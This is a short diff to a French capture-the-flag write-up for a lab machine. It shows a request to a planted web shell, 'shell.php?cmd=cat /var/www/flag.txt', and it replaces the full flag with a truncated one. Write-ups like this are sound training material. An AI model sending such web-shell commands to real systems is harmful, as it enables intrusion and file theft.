@@ -147,6 +147,4 @@ On cherche le fichier de flag. En explorant le système on trouve qu'il est dans
 http://thetoppers.htb/shell.php?cmd=cat%20/var/www/flag.txt
 ```
  
-**Flag :** `a980d99281a28d638ac68b9bf9453c2b`
- 
----
+**Flag :** `a98...`
